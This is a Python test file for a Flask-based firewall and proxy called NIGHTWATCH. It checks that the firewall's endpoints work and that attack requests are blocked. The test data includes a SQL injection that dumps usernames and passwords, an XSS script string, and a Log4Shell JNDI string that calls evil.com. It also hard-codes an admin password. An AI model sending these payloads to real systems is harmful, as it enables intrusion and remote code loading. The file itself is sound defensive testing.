"""
tests/test_phase3.py
NIGHTWATCH Phase 3 — API + Proxy Test

Tests the Flask API endpoints directly (no server needed).
Uses Flask test client — faster than spinning up a real server.
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import json
from app import create_app

GREEN  = "\033[92m"
RED    = "\033[91m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

app    = create_app()
client = app.test_client()


def test(name, fn):
    try:
        fn()
        print(f"  [{GREEN}PASS{RESET}] {name}")
        return True
    except AssertionError as e:
        print(f"  [{RED}FAIL{RESET}] {name}: {e}")
        return False
    except Exception as e:
        print(f"  [{RED}ERR {RESET}] {name}: {e}")
        return False


def run_tests():
    results = []

    # ── Health check ──────────────────────────────────────────────
    def t_health():
        r = client.get("/api/health")
        assert r.status_code == 200
        data = r.get_json()
        assert data["status"] == "ok"
        assert "rules_loaded" in data
        assert data["rules_loaded"] == 30

    results.append(test("GET /api/health returns ok", t_health))

    # ── Analyze clean request ─────────────────────────────────────
    def t_clean():
        payload = {
            "method": "GET",
            "url": "/products?category=shoes",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "1.1.1.1",
        }
        r = client.post("/api/analyze", json=payload)
        assert r.status_code == 200
        data = r.get_json()
        assert data["verdict"] == "ALLOW"
        assert data["blocked"] == False

    results.append(test("POST /api/analyze — clean request → ALLOW", t_clean))

    # ── Analyze SQLi ──────────────────────────────────────────────
    def t_sqli():
        payload = {
            "method": "GET",
            "url": "/search?q=1' UNION SELECT username,password FROM users--",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "5.5.5.5",
        }
        r = client.post("/api/analyze", json=payload)
        assert r.status_code == 200
        data = r.get_json()
        assert data["verdict"] == "BLOCK"
        assert data["blocked"] == True

    results.append(test("POST /api/analyze — SQLi → BLOCK", t_sqli))

    # ── Analyze XSS ───────────────────────────────────────────────
    def t_xss():
        payload = {
            "method": "GET",
            "url": "/page?q=<script>alert(1)</script>",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "6.6.6.6",
        }
        r = client.post("/api/analyze", json=payload)
        assert r.status_code == 200
        data = r.get_json()
        assert data["verdict"] == "BLOCK"

    results.append(test("POST /api/analyze — XSS → BLOCK", t_xss))

    # ── Analyze Log4Shell in header ───────────────────────────────
    def t_log4shell():
        payload = {
            "method": "GET",
            "url": "/",
            "headers": {"User-Agent": "${jndi:ldap://evil.com/x}"},
            "body": "",
            "ip": "7.7.7.7",
        }
        r = client.post("/api/analyze", json=payload)
        assert r.status_code == 200
        data = r.get_json()
        assert data["verdict"] == "BLOCK"

    results.append(test("POST /api/analyze — Log4Shell → BLOCK", t_log4shell))

    # ── Stats endpoint ────────────────────────────────────────────
    def t_stats():
        r = client.get("/api/stats")
        assert r.status_code == 200
        data = r.get_json()
        assert "total_requests" in data
        assert "block_rate" in data
        assert data["total_requests"] >= 3   # we've made 3 analyze calls above

    results.append(test("GET /api/stats returns counters", t_stats))

    # ── Rules endpoint ────────────────────────────────────────────
    def t_rules():
        r = client.get("/api/rules")
        assert r.status_code == 200
        data = r.get_json()
        assert data["total"] == 30
        assert len(data["rules"]) == 30
        assert len(data["attack_types"]) == 10

    results.append(test("GET /api/rules returns 30 rules", t_rules))

    # ── Blocklist ─────────────────────────────────────────────────
    def t_blocklist():
        # Get JWT token first
        lr = client.post("/auth/login", json={"username": "admin", "password": "nightwatch2024"})
        token = lr.get_json()["token"]
        headers = {"Authorization": f"Bearer {token}"}

        # Add
        r = client.post("/api/blocklist/add", json={"ip": "9.9.9.9", "reason": "test"}, headers=headers)
        assert r.status_code == 200

        # List
        r = client.get("/api/blocklist")
        data = r.get_json()
        ips = [entry["ip"] for entry in data["blocked_ips"]]
        assert "9.9.9.9" in ips

        # Remove
        r = client.post("/api/blocklist/remove", json={"ip": "9.9.9.9"}, headers=headers)
        assert r.status_code == 200

    results.append(test("Blocklist add/list/remove", t_blocklist))

    # ── Bad request handling ──────────────────────────────────────
    def t_bad_request():
        r = client.post("/api/analyze", data="not json", content_type="text/plain")
        assert r.status_code == 400

    results.append(test("POST /api/analyze with bad body → 400", t_bad_request))

    # ── Proxy blocks attack ───────────────────────────────────────
    def t_proxy_block():
        # Send an attack directly through the proxy route
        r = client.get("/search?q=1' UNION SELECT * FROM users--")
        # Should be 403 Forbidden
        assert r.status_code == 403
        data = r.get_json()
        assert data["blocked"] == True
        assert "X-Nightwatch-Verdict" in r.headers
        assert r.headers["X-Nightwatch-Verdict"] == "BLOCK"

    results.append(test("Proxy blocks SQLi attack (403 + header)", t_proxy_block))

    # ── Proxy adds security headers ───────────────────────────────
    def t_security_headers():
        r = client.get("/search?q=1' UNION SELECT * FROM users--")
        assert "X-Content-Type-Options" in r.headers
        assert "X-Frame-Options" in r.headers
        assert "X-Nightwatch-Protected" in r.headers

    results.append(test("Proxy adds security headers on blocked response", t_security_headers))

    # ── Summary ───────────────────────────────────────────────────
    passed = sum(results)
    total  = len(results)
    print(f"\n{BOLD}{'═'*55}")
    color  = GREEN if passed == total else RED
    print(f"  Result: {color}{passed}/{total} passed{RESET}")
    print(f"{'═'*55}\n")
    return passed == total


if __name__ == "__main__":
    print(f"\n{BOLD}{CYAN}{'═'*55}{RESET}")
    print(f"{BOLD}{CYAN}  🦉 NIGHTWATCH — Phase 3 API Test Suite{RESET}")
    print(f"{BOLD}{CYAN}{'═'*55}{RESET}\n")
    success = run_tests()
    sys.exit(0 if success else 1)
